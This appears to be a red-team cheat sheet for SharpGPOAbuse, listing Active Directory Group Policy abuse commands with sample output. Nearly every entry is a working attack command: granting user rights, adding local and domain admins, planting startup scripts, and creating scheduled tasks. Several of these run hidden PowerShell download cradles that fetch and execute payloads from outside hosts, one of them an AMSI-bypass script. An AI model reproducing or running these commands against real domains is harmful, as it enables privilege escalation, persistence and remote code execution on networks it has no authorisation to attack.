# SharpGPOAbuse

* [https://github.com/FSecureLABS/SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)
* Attach Types

```
--AddUserRights 		Add rights to a user
--AddLocalAdmin 		Add a user to the local admins group
--AddComputerScript 	Add a new computer startup script
--AddUserScript 		Configure a user logon script
--AddComputerTask 		Configure a computer immediate task
--AddUserTask 			Add an immediate task to a user
```

### Add User Rights

```
SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount bob.smith --GPOName "Vulnerable GPO"
.\SharpGPOAbuse.exe -AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount vihaan --GPOName "MGMTTestGPO3" --Domain MGMT.EVERGREENHEALTH.SYS --DomainController DC04
```

### Add Local Admin

```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName "Vulnerable GPO"
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount tnguyen --GPOName "MGMTTestGPO" --Domain MGMT.EVERGREENHEALTH.SYS --DomainController DC04
```

### Computer Startup Script

* Enumerate shares in order to place a binary (powerview)

```
powershell Find-DomainShare -CheckShareAccess

Name           Type Remark              ComputerName
----           ---- ------              ------------
software          0                     dc-2.dev.cyberbotic.io
```

* It can go in any remote location as long as its accessible by the target computers

### Create and drop a start up script

```
execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b \\dc-2\software\dns_x64.exe" --GPOName "Vulnerable GPO"

[+] Domain = dev.cyberbotic.io
[+] Domain Controller = dc-2.dev.cyberbotic.io
[+] Distinguished Name = CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io
[+] GUID Of "Vulnerable GPO" is: {5059FAC1-5E94-4361-95D3-3BB235A23928}
[+] Creating new startup script...
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new startup script. Wait For the GPO refresh cycle.
[+] Done!
```

* You need to force and update and reboot to execute the startup script

```
gpupdate /force
```

### Add user script

```
SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"

# RUN ONLY ON A SPECIFIC USER
SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents "if %username%==<targetusername> powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
```

### Add Computer Task

```
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"

.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Test" --GPOName "MGMTGPO" --Command 'C:\Windows\System32\cmd.exe' --Arguments '/c net group "Domain Admins" vihaan /add /dom' --Author Administrator

# FILTER FOR SPECIFIC COMPUTER
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO" --FilterEnabled --TargetDnsName target.domain.com

.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author MGMT\bryan --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c IEX(wget http://172.16.118.3:80/ps_amsi_enc.ps1 -usebasicparsing)" --GPOName "MGMTGPO" --FilterEnabled --TargetDnsName DC04.MGMT.EVERGREENHEALTH.SYS --Domain MGMT.EVERGREENHEALTH.SYS --DomainController DC04.MGMT.EVERGREENHEALTH.SYS
```

### Add User Task

```
SharpGPOAbuse.exe --AddUserTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
```
